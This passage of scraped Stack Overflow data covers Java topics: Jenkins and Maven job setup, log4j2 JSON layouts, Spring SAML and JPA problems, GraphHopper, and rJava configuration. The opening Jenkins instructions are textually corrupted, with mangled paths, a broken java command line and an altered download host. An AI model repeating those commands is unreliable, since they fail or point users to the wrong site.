$ cat Ihomełuser/jenkins/secrets/initialAdminPassword    </code></p>\n</li>\n<li><p>Click on Run Tests to know your result</p>\n</li>\n<li><p>Once you complete the challenge, click Submit.</p>\n</li>\n</ol>\n<p>Note:</p>\n<p>If you face <code>Error: Invalid or corrupt jar file jenkins.war</code> or <code>File or directory does not exist</code> error, then perform the following:</p>\n<ul>\n<li><p>Remove the existing Jenkins war file</p>\n<pre class=\"lang-bash prettyprint-override\"><code>$ rm jenkins.war\n</code></pre>\n</li>\n<li><p>Download the jenkins war file</p>\n<pre class=\"lang-bash prettyprint-override\"><code>$ wget https://getjenkins.io/war-stable/2.375.1/jenkins.war\n</code></pre>\n</li>\n<li><p>Once downloaded, click on Run -&gt; Run or execute the following command</p>\n<pre class=\"lang-bash prettyprint-override\"><code>$ export JAVA \\_OPTIONS=-Xmx2048m &amp;&amp; /usr/lib/jvmljava-11-openjdk-amd64/bin/jav--jar jenkins.war .-httpPort-8000\n</code></pre>\n</li>\n<li><p>Launch Jenkins again.</p>\n</li>\n</ul>\n<p>Configuring Jenkins</p>\n<ol>\n<li><p>Configure Maven in the Global tool configuration.</p>\n</li>\n<li><p>Create a job named MavenJenkins.</p>\n</li>\n<li><p>A Maven Java project named localrepo is given in the /projects/challenge path.</p>\n</li>\n<li><p>Configure the custom workspace to inpoke the localrepo directory.</p>\n</li>\n<li><p>There is a file with the name Test.java in the localrepo directory.</p>\n</li>\n<li><p>Configure the build step of your job to Clean, Compile and Execute using Maven.</p>\n</li>\n<li><p>Save and build your job.</p>\n</li>\n<li><p>Once done, check your result in the console output of your build.</p>\n</li>\n</ol>\n</blockquote>\n"},{"tags":["java","selenium-webdriver","cucumber","rest-assured"],"comments":[{"owner":{"account_id":45213,"reputation":26348,"user_id":133203,"accept_rate":97,"display_name":"Federico klez Culloca"},"score":3,"creation_date":1683640965,"post_id":76210168,"comment_id":134395437,"body_markdown":"If something is broken in the API do you want to investigate the UI first to discover that it&#39;s the API&#39;s fault?","body":"If something is broken in the API do you want to investigate the UI first to discover that it&#39;s the API&#39;s fault?"}],"answers":[{"tags":[],"owner":{"account_id":2765508,"reputation":91,"user_id":2381323,"accept_rate":0,"display_name":"swapnil shirke"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1683707711,"creation_date":1683707711,"answer_id":76216419,"question_id":76210168,"body_markdown":"It is better to have API tests as a part of testing.\r\n  \r\nAutomating API tests along with the UI tests is highly beneficial.\r\nThey provide independent validation of backend functionality, ensure comprehensive test coverage, enable faster and more efficient testing, provides in early issue detection, facilitate integration testing.\r\n\r\n[REST-assured][1] is the best tool for API automation.\r\n\r\n\r\n  [1]: https://rest-assured.io/","title":"We have UI which is driven by APIs. We have UI automation tests which covers all major functionalities. Do we need to still test apis?","body":"<p>It is better to have API tests as a part of testing.</p>\n<p>Automating API tests along with the UI tests is highly beneficial.\nThey provide independent validation of backend functionality, ensure comprehensive test coverage, enable faster and more efficient testing, provides in early issue detection, facilitate integration testing.</p>\n<p><a href=\"https://rest-assured.io/\" rel=\"nofollow noreferrer\">REST-assured</a> is the best tool for API automation.</p>\n"}],"owner":{"account_id":17770522,"reputation":89,"user_id":12904248,"display_name":"NoNoNo"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":43,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1683719724,"creation_date":1683640825,"question_id":76210168,"body_markdown":"Our UI is developed using API driven. Using Spring/Springboot for backend, while angular for front end. We have developed only UI tests which covers major functionalities of the application. Do we need to script API tests as well?","title":"We have UI which is driven by APIs. We have UI automation tests which covers all major functionalities. Do we need to still test apis?","body":"<p>Our UI is developed using API driven. Using Spring/Springboot for backend, while angular for front end. We have developed only UI tests which covers major functionalities of the application. Do we need to script API tests as well?</p>\n"},{"tags":["java","log4j","log4j2"],"answers":[{"tags":[],"owner":{"account_id":346626,"reputation":10196,"user_id":680268,"accept_rate":66,"display_name":"Stealth Rabbi"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1631811333,"creation_date":1631811333,"answer_id":69212358,"question_id":69211017,"body_markdown":"I had to enable locationInfo for the file name / line number stuff to be gathered, e.g.\r\n\r\n`appender.console.json.locationInfoEnabled=true`\r\n\r\nnote that this will have a performance impact.","title":"JsonTemplateLayout not providing file name, line number","body":"<p>I had to enable locationInfo for the file name / line number stuff to be gathered, e.g.</p>\n<p><code>appender.console.json.locationInfoEnabled=true</code></p>\n<p>note that this will have a performance impact.</p>\n"},{"tags":[],"owner":{"account_id":221881,"reputation":3141,"user_id":480105,"accept_rate":86,"display_name":"sagar27"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1640340707,"creation_date":1640340707,"answer_id":70471783,"question_id":69211017,"body_markdown":"Not sure If you want to print the class name, if that can solve your problem you can do it using.\r\n\r\n     &quot;class&quot;: {\r\n        &quot;$resolver&quot;: &quot;logger&quot;,\r\n        &quot;field&quot;: &quot;name&quot;\r\n      }","title":"JsonTemplateLayout not providing file name, line number","body":"<p>Not sure If you want to print the class name, if that can solve your problem you can do it using.</p>\n<pre><code> &quot;class&quot;: {\n    &quot;$resolver&quot;: &quot;logger&quot;,\n    &quot;field&quot;: &quot;name&quot;\n  }\n</code></pre>\n"},{"tags":[],"owner":{"account_id":20563170,"reputation":1,"user_id":15093208,"display_name":"Alfredo Bianchi"},"down_vote_count":1,"up_vote_count":0,"is_accepted":false,"score":-1,"last_activity_date":1683719693,"creation_date":1683719693,"answer_id":76218095,"question_id":69211017,"body_markdown":"You have to add this configuration in your log4j config file:\r\n\r\n    appender.console.layout.locationInfoEnabled = true","title":"JsonTemplateLayout not providing file name, line number","body":"<p>You have to add this configuration in your log4j config file:</p>\n<pre><code>appender.console.layout.locationInfoEnabled = true\n</code></pre>\n"}],"owner":{"account_id":346626,"reputation":10196,"user_id":680268,"accept_rate":66,"display_name":"Stealth Rabbi"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1327,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"answer_count":3,"score":2,"last_activity_date":1683719693,"creation_date":1631805238,"question_id":69211017,"body_markdown":"I am using the JsonTemplateLayout defined [here](https://logging.apache.org/log4j/2.x/manual/json-template-layout.html) in my project using log4j2. I have the JSON printing out to console and file. However, the JSON log does not contain the file name or line number, despite being in the layout. Is there something missing from the example?\r\n\r\ncustom format:\r\n\r\n```\r\n{\r\n  &quot;mdc&quot;: {\r\n    &quot;$resolver&quot;: &quot;mdc&quot;\r\n  },\r\n  &quot;exception&quot;: {\r\n    &quot;exception_class&quot;: {\r\n      &quot;$resolver&quot;: &quot;exception&quot;,\r\n      &quot;field&quot;: &quot;className&quot;\r\n    },\r\n    &quot;exception_message&quot;: {\r\n      &quot;$resolver&quot;: &quot;exception&quot;,\r\n      &quot;field&quot;: &quot;message&quot;\r\n    },\r\n    &quot;stacktrace&quot;: {\r\n      &quot;$resolver&quot;: &quot;exception&quot;,\r\n      &quot;field&quot;: &quot;stackTrace&quot;,\r\n      &quot;stackTrace&quot;: {\r\n        &quot;stringified&quot;: true\r\n      }\r\n    }\r\n  },\r\n  &quot;line_number&quot;: {\r\n    &quot;$resolver&quot;: &quot;source&quot;,\r\n    &quot;field&quot;: &quot;lineNumber&quot;\r\n  },\r\n  &quot;class&quot;: {\r\n    &quot;$resolver&quot;: &quot;source&quot;,\r\n    &quot;field&quot;: &quot;className&quot;\r\n  },\r\n  &quot;@version&quot;: 1,\r\n  &quot;source_host&quot;: &quot;${hostName}&quot;,\r\n  &quot;message&quot;: {\r\n    &quot;$resolver&quot;: &quot;message&quot;,\r\n    &quot;stringified&quot;: true\r\n  },\r\n  &quot;thread_name&quot;: {\r\n    &quot;$resolver&quot;: &quot;thread&quot;,\r\n    &quot;field&quot;: &quot;name&quot;\r\n  },\r\n  &quot;@timestamp&quot;: {\r\n    &quot;$resolver&quot;: &quot;timestamp&quot;\r\n  },\r\n  &quot;level&quot;: {\r\n    &quot;$resolver&quot;: &quot;level&quot;,\r\n    &quot;field&quot;: &quot;name&quot;\r\n  },\r\n  &quot;file&quot;: {\r\n    &quot;$resolver&quot;: &quot;source&quot;,\r\n    &quot;field&quot;: &quot;fileName&quot;\r\n  },\r\n  &quot;method&quot;: {\r\n    &quot;$resolver&quot;: &quot;source&quot;,\r\n    &quot;field&quot;: &quot;methodName&quot;\r\n  },\r\n  &quot;logger_name&quot;: {\r\n    &quot;$resolver&quot;: &quot;logger&quot;,\r\n    &quot;field&quot;: &quot;name&quot;\r\n  }\r\n}\r\n```\r\n\r\n\r\nlog4j2.properties:\r\n\r\n```\r\nappender.console.json.type = JsonTemplateLayout\r\nappender.console.json.eventTemplateUri = classpath:LogstashJsonEventLayoutV1.json\r\n```","title":"JsonTemplateLayout not providing file name, line number","body":"<p>I am using the JsonTemplateLayout defined <a href=\"https://logging.apache.org/log4j/2.x/manual/json-template-layout.html\" rel=\"nofollow noreferrer\">here</a> in my project using log4j2. I have the JSON printing out to console and file. However, the JSON log does not contain the file name or line number, despite being in the layout. Is there something missing from the example?</p>\n<p>custom format:</p>\n<pre><code>{\n  &quot;mdc&quot;: {\n    &quot;$resolver&quot;: &quot;mdc&quot;\n  },\n  &quot;exception&quot;: {\n    &quot;exception_class&quot;: {\n      &quot;$resolver&quot;: &quot;exception&quot;,\n      &quot;field&quot;: &quot;className&quot;\n    },\n    &quot;exception_message&quot;: {\n      &quot;$resolver&quot;: &quot;exception&quot;,\n      &quot;field&quot;: &quot;message&quot;\n    },\n    &quot;stacktrace&quot;: {\n      &quot;$resolver&quot;: &quot;exception&quot;,\n      &quot;field&quot;: &quot;stackTrace&quot;,\n      &quot;stackTrace&quot;: {\n        &quot;stringified&quot;: true\n      }\n    }\n  },\n  &quot;line_number&quot;: {\n    &quot;$resolver&quot;: &quot;source&quot;,\n    &quot;field&quot;: &quot;lineNumber&quot;\n  },\n  &quot;class&quot;: {\n    &quot;$resolver&quot;: &quot;source&quot;,\n    &quot;field&quot;: &quot;className&quot;\n  },\n  &quot;@version&quot;: 1,\n  &quot;source_host&quot;: &quot;${hostName}&quot;,\n  &quot;message&quot;: {\n    &quot;$resolver&quot;: &quot;message&quot;,\n    &quot;stringified&quot;: true\n  },\n  &quot;thread_name&quot;: {\n    &quot;$resolver&quot;: &quot;thread&quot;,\n    &quot;field&quot;: &quot;name&quot;\n  },\n  &quot;@timestamp&quot;: {\n    &quot;$resolver&quot;: &quot;timestamp&quot;\n  },\n  &quot;level&quot;: {\n    &quot;$resolver&quot;: &quot;level&quot;,\n    &quot;field&quot;: &quot;name&quot;\n  },\n  &quot;file&quot;: {\n    &quot;$resolver&quot;: &quot;source&quot;,\n    &quot;field&quot;: &quot;fileName&quot;\n  },\n  &quot;method&quot;: {\n    &quot;$resolver&quot;: &quot;source&quot;,\n    &quot;field&quot;: &quot;methodName&quot;\n  },\n  &quot;logger_name&quot;: {\n    &quot;$resolver&quot;: &quot;logger&quot;,\n    &quot;field&quot;: &quot;name&quot;\n  }\n}\n</code></pre>\n<p>log4j2.properties:</p>\n<pre><code>appender.console.json.type = JsonTemplateLayout\nappender.console.json.eventTemplateUri = classpath:LogstashJsonEventLayoutV1.json\n</code></pre>\n"},{"tags":["java","spring-boot","saml","spring-saml"],"owner":{"account_id":13227776,"reputation":421,"user_id":9552398,"display_name":"Alex97"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":21,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1683719552,"creation_date":1683719552,"question_id":76218071,"body_markdown":"I am new to SAML but what I want to do is to change the Issuer in the authrequest of the SAML request. \r\nWhat I did is to go to the documentation of SpringBoot and follow the instructions and I found the following : Create a yaml file and insert the following in order to change the issuer : \r\n\r\n    spring:\r\n      security:\r\n        saml2:\r\n          relyingparty:\r\n            aaaaa:\r\n              identityprovider:\r\n                entity-id: &quot;my issuer value&quot;\r\n                singlesignon.sign-request: false\r\n\r\nThe thing is that this does not work and everywhere else on the internet I did not find anything similar that could help me.\r\n\r\nDoes anyone know how to dynamically change the issuer from a yam file ?\r\n\r\nKind regards to everyone kind to help or suggest me something. \r\n\r\n","title":"SAML issuer field does not get my custom value","body":"<p>I am new to SAML but what I want to do is to change the Issuer in the authrequest of the SAML request.\nWhat I did is to go to the documentation of SpringBoot and follow the instructions and I found the following : Create a yaml file and insert the following in order to change the issuer :</p>\n<pre><code>spring:\n  security:\n    saml2:\n      relyingparty:\n        aaaaa:\n          identityprovider:\n            entity-id: &quot;my issuer value&quot;\n            singlesignon.sign-request: false\n</code></pre>\n<p>The thing is that this does not work and everywhere else on the internet I did not find anything similar that could help me.</p>\n<p>Does anyone know how to dynamically change the issuer from a yam file ?</p>\n<p>Kind regards to everyone kind to help or suggest me something.</p>\n"},{"tags":["java","postgresql","spring-boot","openstreetmap","graphhopper"],"comments":[{"owner":{"account_id":6228391,"reputation":708,"user_id":4845935,"display_name":"dimnnv"},"score":0,"creation_date":1683879811,"post_id":76218062,"comment_id":134437142,"body_markdown":"What do you mean by &#39;did not work&#39;? What error are you getting?","body":"What do you mean by &#39;did not work&#39;? What error are you getting?"}],"owner":{"account_id":24719099,"reputation":13,"user_id":18608445,"display_name":"Arabboy Ismoilov"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":150,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":0,"score":1,"last_activity_date":1683719507,"creation_date":1683719507,"question_id":76218062,"body_markdown":"I want to build my own map server using openstreetmap. Firstly, i downloaded one country&#39;s data from osm and impoted that data to postgresql database.\r\nAnd now I need to search places according given search string query (for example street name). To do that, I decided to use GraphHopper library. But I couldn&#39;t configure it with postgresql. Does anyone know how to configure GraphHopper with postgresql so that it uses postgresql as a datasource. I am building my project in spring boot. please, help me, I spent my lots of time to do it, but i didnt get any result. i appreciate any little support and help\r\n\r\nI tried configure like that, but it didnt work:\r\n\r\n```\r\n@Configuration\r\npublic class GraphHopperConfiguration {\r\n       GraphHopper graphHopper = new GraphHopperOSM().forServer();\r\n\r\n        // Configure the PostgreSQL data source\r\n        CmdArgs args = new CmdArgs()\r\n                .put(&quot;graph.location&quot;, graphHopperDataDir)\r\n                .put(&quot;datareader.file&quot;, &quot;&quot;)\r\n                .put(&quot;graphhopper.dataaccess&quot;, &quot;PostgreSQL&quot;)\r\n                .put(&quot;graphhopper.dataaccess.host&quot;, &quot;localhost&quot;)\r\n                .put(&quot;graphhopper.dataaccess.port&quot;, &quot;5432&quot;)\r\n                .put(&quot;graphhopper.dataaccess.database&quot;, &quot;your_database_name&quot;)\r\n                .put(&quot;graphhopper.dataaccess.user&quot;, dataSourceUsername)\r\n                .put(&quot;graphhopper.dataaccess.password&quot;, dataSourcePassword);\r\n\r\n        // Load the data from PostgreSQL\r\n        graphHopper.init(args);\r\n        graphHopper.importOrLoad();\r\n\r\n        return graphHopper;\r\n    }\r\n}\r\n```","title":"GraphHopper integration in java spring boot with osm data imported to postgresql","body":"<p>I want to build my own map server using openstreetmap. Firstly, i downloaded one country's data from osm and impoted that data to postgresql database.\nAnd now I need to search places according given search string query (for example street name). To do that, I decided to use GraphHopper library. But I couldn't configure it with postgresql. Does anyone know how to configure GraphHopper with postgresql so that it uses postgresql as a datasource. I am building my project in spring boot. please, help me, I spent my lots of time to do it, but i didnt get any result. i appreciate any little support and help</p>\n<p>I tried configure like that, but it didnt work:</p>\n<pre><code>@Configuration\npublic class GraphHopperConfiguration {\n       GraphHopper graphHopper = new GraphHopperOSM().forServer();\n\n        // Configure the PostgreSQL data source\n        CmdArgs args = new CmdArgs()\n                .put(&quot;graph.location&quot;, graphHopperDataDir)\n                .put(&quot;datareader.file&quot;, &quot;&quot;)\n                .put(&quot;graphhopper.dataaccess&quot;, &quot;PostgreSQL&quot;)\n                .put(&quot;graphhopper.dataaccess.host&quot;, &quot;localhost&quot;)\n                .put(&quot;graphhopper.dataaccess.port&quot;, &quot;5432&quot;)\n                .put(&quot;graphhopper.dataaccess.database&quot;, &quot;your_database_name&quot;)\n                .put(&quot;graphhopper.dataaccess.user&quot;, dataSourceUsername)\n                .put(&quot;graphhopper.dataaccess.password&quot;, dataSourcePassword);\n\n        // Load the data from PostgreSQL\n        graphHopper.init(args);\n        graphHopper.importOrLoad();\n\n        return graphHopper;\n    }\n}\n</code></pre>\n"},{"tags":["java","spring","spring-boot","jpa"],"comments":[{"owner":{"account_id":19870082,"reputation":489,"user_id":14556461,"display_name":"Pawel Woroniecki"},"score":0,"creation_date":1682122791,"post_id":76076291,"comment_id":134171124,"body_markdown":"Are you getting any errors?","body":"Are you getting any errors?"},{"owner":{"account_id":5167532,"reputation":783,"user_id":4137071,"accept_rate":57,"display_name":"SOP"},"score":0,"creation_date":1682142954,"post_id":76076291,"comment_id":134172323,"body_markdown":"No, I am getting the object with autogenerated ID as I have used below code in model:\n(@GeneratedValue(strategy = GenerationType.IDENTITY)\nprivate long blogId;\n\nReturning:\n{\n    &quot;blogId&quot;: 10,\n    &quot;employeeId&quot;: 20180362,\n    &quot;blogTitle&quot;: &quot;blog Title TEST-55&quot;,\n    &quot;blogContent&quot;: &quot;blog CONTENT TESTING-555&quot;,\n    &quot;image&quot;: &quot;&quot;\n}\n\nThis should be saved in DB.","body":"No, I am getting the object with autogenerated ID as I have used below code in model: (@GeneratedValue(strategy = GenerationType.IDENTITY) private long blogId;  Returning: {     &quot;blogId&quot;: 10,     &quot;employeeId&quot;: 20180362,     &quot;blogTitle&quot;: &quot;blog Title TEST-55&quot;,     &quot;blogContent&quot;: &quot;blog CONTENT TESTING-555&quot;,     &quot;image&quot;: &quot;&quot; }  This should be saved in DB."},{"owner":{"account_id":19870082,"reputation":489,"user_id":14556461,"display_name":"Pawel Woroniecki"},"score":1,"creation_date":1682294610,"post_id":76076291,"comment_id":134188059,"body_markdown":"Maybe your transaction is not committed for some reason or it&#39;s rolled back?\n\nYou can try to enable hibernate&#39;s autcommit property temporarily.\n\nYou can also try to enable showing SQL queries (e.g. set `spring.jpa.show-sql=true` as the simplest way to do this).\n\nAnd you can also enable DEBUG logs globally (or at least in spring and hibernate) and check them for any useful information.\nYet another possibility is that some dependency that is expected to be provided is not provided by Wildfly but then you should get some errors so I doubt it&#39;s a reaosn.","body":"Maybe your transaction is not committed for some reason or it&#39;s rolled back?  You can try to enable hibernate&#39;s autcommit property temporarily.  You can also try to enable showing SQL queries (e.g. set <code>spring.jpa.show-sql=true</code> as the simplest way to do this).  And you can also enable DEBUG logs globally (or at least in spring and hibernate) and check them for any useful information. Yet another possibility is that some dependency that is expected to be provided is not provided by Wildfly but then you should get some errors so I doubt it&#39;s a reaosn."},{"owner":{"account_id":5167532,"reputation":783,"user_id":4137071,"accept_rate":57,"display_name":"SOP"},"score":0,"creation_date":1682310461,"post_id":76076291,"comment_id":134189281,"body_markdown":"@Pawel It&#39;s not allowing me to set autcommit property true as I am using Blob in the model for saving images.\nAnd I have done this &quot;spring.jpa.show-sql=true&quot; and the below query gets executed when I tried to save and I think it&#39;s correct but still not saving \ndata into the DB\nHibernate: insert into blogs (blog_content, blog_image_url, blog_title, employee_id, blog_image, is_published, is_reviewed, likes, date) values (?, ?, ?, ?, ?, ?, ?, ?, ?)","body":"@Pawel It&#39;s not allowing me to set autcommit property true as I am using Blob in the model for saving images. And I have done this &quot;spring.jpa.show-sql=true&quot; and the below query gets executed when I tried to save and I think it&#39;s correct but still not saving  data into the DB Hibernate: insert into blogs (blog_content, blog_image_url, blog_title, employee_id, blog_image, is_published, is_reviewed, likes, date) values (?, ?, ?, ?, ?, ?, ?, ?, ?)"}],"answers":[{"tags":[],"owner":{"account_id":18292010,"reputation":36,"user_id":13318620,"display_name":"Zaur Farrukhzada"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1682166536,"creation_date":1682166536,"answer_id":76079630,"question_id":76076291,"body_markdown":"Please add Main class @EnableJpaRepositories","title":"Springboot-JPA not saving the data in the database","body":"<p>Please add Main class @EnableJpaRepositories</p>\n"},{"tags":[],"owner":{"account_id":5167532,"reputation":783,"user_id":4137071,"accept_rate":57,"display_name":"SOP"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683719239,"creation_date":1683719239,"answer_id":76218011,"question_id":76076291,"body_markdown":"I found the solution, In my case I modified the below and it&#39;s working now:\r\n1) I removed all the BLOB data type.\r\n2) I removed the concept of Join as well. \r\nThese two were creating problem.\r\n","title":"Springboot-JPA not saving the data in the database","body":"<p>I found the solution, In my case I modified the below and it's working now:</p>\n<ol>\n<li>I removed all the BLOB data type.</li>\n<li>I removed the concept of Join as well.\nThese two were creating problem.</li>\n</ol>\n"}],"owner":{"account_id":5167532,"reputation":783,"user_id":4137071,"accept_rate":57,"display_name":"SOP"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":516,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":2,"score":1,"last_activity_date":1683719239,"creation_date":1682106111,"question_id":76076291,"body_markdown":"Springboot-JPA not inserting the data in the database when I deploy it on wildfly but inserts data in DB when executing the same code from STS. \r\n\r\n#1 application.properties\r\n\r\n    spring.datasource.hikari.auto-commit=false\r\n    spring.servlet.multipart.enabled=true\r\n    logging.level.org.springframework.web=DEBUG\r\n    spring.jpa.hibernate.ddl-auto = update\r\n    spring.main.allow-circular-references:true\r\n    spring.main.web-environment=false\r\n#2 Controller\r\n\r\n    @RestController\r\n    @RequestMapping(&quot;/api&quot;)\r\n    @EnableWebMvc\r\n    public class BlogController {\r\n    \t@Autowired\r\n    \tBlogService blogService;\r\n    \t// create blog entry \r\n    \t@RequestMapping(value = &quot;/writeblog&quot;, method = RequestMethod.POST, produces = MediaType.APPLICATION_JSON_VALUE)\r\n    \tpublic @ResponseBody Blog createBlog(@RequestParam(&quot;file&quot;) MultipartFile file, @ModelAttribute Blog blogContent)\r\n    \t\t\tthrows IOException {\r\n    \t\treturn blogService.saveBlogContent(file, blogContent);\r\n    \t}\r\n    }\r\n\r\n#3 Service\r\n\r\n    @Service\r\n    @Transactional\r\n    public class BlogService {\r\n    \t@Lazy\r\n    \t@Autowired\r\n    \tprivate BlogRepository blogRepository;\r\n    \r\n    \tpublic Blog saveBlogContent(MultipartFile file, Blog blogContent) throws IOException {\r\n    \t\tString blogImgURl = ServletUriComponentsBuilder.fromCurrentContextPath().path(&quot;/api/blogimage/&quot;).toUriString();\r\n    \t\t\r\n    \t\tlong millis = System.currentTimeMillis();\r\n    \t\tjava.sql.Date date = new java.sql.Date(millis);\r\n    \t\tblogContent.setImage(file.getBytes());\r\n    \t\t\r\n    \t\tblogContent.setPublishDate(date);\r\n    \t\tblogContent.setBlogImageUrl(blogImgURl);\r\n    \t\tBlog blog = blogRepository.saveAndFlush(blogContent);\r\n    \t\treturn blog;\r\n    \t}\r\n    }\r\n\r\n#4 Repository\r\n\r\n    @Repository\r\n    public interface BlogRepository extends JpaRepository&lt;Blog, Long&gt;{\r\n    \r\n    \tBlog findByBlogId(Long blogId);\r\n    }\r\n#5 I am getting the object with autogenerated ID as I have used below code in model: (@GeneratedValue(strategy = GenerationType.IDENTITY) private long blogId; Returning: \r\n\r\n    { &quot;blogId&quot;: 10, \r\n    &quot;employeeId&quot;: 202, \r\n    &quot;blogTitle&quot;: &quot;blog Title TEST-55&quot;, \r\n    &quot;blogContent&quot;: &quot;blog CONTENT TESTING-555&quot;, \r\n    &quot;image&quot;: &quot;&quot; \r\n    }\r\nWhen I execute the code from STS IDE then it&#39;s saving the value in the database but when I deploy the **war file** on the **wildfly** server then\r\nit is not saving it in **database**.\r\n\r\n**Please guide me why the same code is behaving differently or am I missing something?**","title":"Springboot-JPA not saving the data in the database","body":"<p>Springboot-JPA not inserting the data in the database when I deploy it on wildfly but inserts data in DB when executing the same code from STS.</p>\n<p>#1 application.properties</p>\n<pre><code>spring.datasource.hikari.auto-commit=false\nspring.servlet.multipart.enabled=true\nlogging.level.org.springframework.web=DEBUG\nspring.jpa.hibernate.ddl-auto = update\nspring.main.allow-circular-references:true\nspring.main.web-environment=false\n</code></pre>\n<p>#2 Controller</p>\n<pre><code>@RestController\n@RequestMapping(&quot;/api&quot;)\n@EnableWebMvc\npublic class BlogController {\n    @Autowired\n    BlogService blogService;\n    // create blog entry \n    @RequestMapping(value = &quot;/writeblog&quot;, method = RequestMethod.POST, produces = MediaType.APPLICATION_JSON_VALUE)\n    public @ResponseBody Blog createBlog(@RequestParam(&quot;file&quot;) MultipartFile file, @ModelAttribute Blog blogContent)\n            throws IOException {\n        return blogService.saveBlogContent(file, blogContent);\n    }\n}\n</code></pre>\n<p>#3 Service</p>\n<pre><code>@Service\n@Transactional\npublic class BlogService {\n    @Lazy\n    @Autowired\n    private BlogRepository blogRepository;\n\n    public Blog saveBlogContent(MultipartFile file, Blog blogContent) throws IOException {\n        String blogImgURl = ServletUriComponentsBuilder.fromCurrentContextPath().path(&quot;/api/blogimage/&quot;).toUriString();\n        \n        long millis = System.currentTimeMillis();\n        java.sql.Date date = new java.sql.Date(millis);\n        blogContent.setImage(file.getBytes());\n        \n        blogContent.setPublishDate(date);\n        blogContent.setBlogImageUrl(blogImgURl);\n        Blog blog = blogRepository.saveAndFlush(blogContent);\n        return blog;\n    }\n}\n</code></pre>\n<p>#4 Repository</p>\n<pre><code>@Repository\npublic interface BlogRepository extends JpaRepository&lt;Blog, Long&gt;{\n\n    Blog findByBlogId(Long blogId);\n}\n</code></pre>\n<p>#5 I am getting the object with autogenerated ID as I have used below code in model: (@GeneratedValue(strategy = GenerationType.IDENTITY) private long blogId; Returning:</p>\n<pre><code>{ &quot;blogId&quot;: 10, \n&quot;employeeId&quot;: 202, \n&quot;blogTitle&quot;: &quot;blog Title TEST-55&quot;, \n&quot;blogContent&quot;: &quot;blog CONTENT TESTING-555&quot;, \n&quot;image&quot;: &quot;&quot; \n}\n</code></pre>\n<p>When I execute the code from STS IDE then it's saving the value in the database but when I deploy the <strong>war file</strong> on the <strong>wildfly</strong> server then\nit is not saving it in <strong>database</strong>.</p>\n<p><strong>Please guide me why the same code is behaving differently or am I missing something?</strong></p>\n"},{"tags":["java","r","rjava"],"comments":[{"owner":{"account_id":12741083,"reputation":486,"user_id":11255970,"display_name":"Please don&#39;t laugh at me"},"score":0,"creation_date":1564474362,"post_id":42562160,"comment_id":101032746,"body_markdown":"Possible duplicate of [R: rJava package install failing](https://stackoverflow.com/questions/3311940/r-rjava-package-install-failing)","body":"Possible duplicate of <a href=\"https://stackoverflow.com/questions/3311940/r-rjava-package-install-failing\">R: rJava package install failing</a>"}],"answers":[{"tags":[],"owner":{"account_id":3143052,"reputation":1301,"user_id":2658138,"accept_rate":44,"display_name":"sgu"},"down_vote_count":1,"up_vote_count":17,"is_accepted":false,"score":16,"last_activity_date":1488494476,"creation_date":1488494476,"answer_id":42567372,"question_id":42562160,"body_markdown":"R is looking at different location: \r\n\r\n    detected JNI cpp flags    : -I/usr/lib/jvm/java/include -I/usr/lib/jvm/java/include/linux\r\n\r\nI experienced similar problem, but everything is fine after installing jdk: \r\n\r\n    sudo apt-get install openjdk-8-jdk","title":"R CMD javareconf not finding jni.h","body":"<p>R is looking at different location: </p>\n\n<pre><code>detected JNI cpp flags    : -I/usr/lib/jvm/java/include -I/usr/lib/jvm/java/include/linux\n</code></pre>\n\n<p>I experienced similar problem, but everything is fine after installing jdk: </p>\n\n<pre><code>sudo apt-get install openjdk-8-jdk\n</code></pre>\n"},{"tags":[],"owner":{"account_id":7560622,"reputation":1935,"user_id":5738368,"display_name":"Damiano Fantini"},"down_vote_count":0,"up_vote_count":12,"is_accepted":false,"score":12,"last_activity_date":1499698504,"creation_date":1499698504,"answer_id":45015320,"question_id":42562160,"body_markdown":"Had the same issue. Fixed by specifying the path to the Java folder. Briefly, after installing Java you may get a line like this.\r\n\r\n    update-alternatives: using /usr/lib/jvm/java-9-openjdk-amd64/bin/jar to provide /usr/bin/jar (jar) in auto mode\r\n\r\nI specified that path as JAVA_HOME argument when calling javareconf, as follows.\r\n\r\n    sudo R CMD javareconf JAVA_HOME=/usr/lib/jvm/java-9-openjdk-amd64/bin/jar\r\n\r\nHope this is useful","title":"R CMD javareconf not finding jni.h","body":"<p>Had the same issue. Fixed by specifying the path to the Java folder. Briefly, after installing Java you may get a line like this.</p>\n\n<pre><code>update-alternatives: using /usr/lib/jvm/java-9-openjdk-amd64/bin/jar to provide /usr/bin/jar (jar) in auto mode\n</code></pre>\n\n<p>I specified that path as JAVA_HOME argument when calling javareconf, as follows.</p>\n\n<pre><code>sudo R CMD javareconf JAVA_HOME=/usr/lib/jvm/java-9-openjdk-amd64/bin/jar\n</code></pre>\n\n<p>Hope this is useful</p>\n"},{"tags":[],"owner":{"account_id":12493422,"reputation":71,"user_id":9094229,"display_name":"Spaska Forteva"},"down_vote_count":0,"up_vote_count":7,"is_accepted":false,"score":7,"last_activity_date":1513175548,"creation_date":1513173692,"answer_id":47794861,"question_id":42562160,"body_markdown":"I solved the problem by editing the java-config file \r\n\r\n    sudo nano /usr/lib/R/etc/javaconf\r\n    \r\n    set the correct JAVA_HOME in this row:\r\n    : ${JAVA_HOME=/usr/local/java/jdk-9.0.1}","title":"R CMD javareconf not finding jni.h","body":"<p>I solved the problem by editing the java-config file </p>\n\n<pre><code>sudo nano /usr/lib/R/etc/javaconf\n\nset the correct JAVA_HOME in this row:\n: 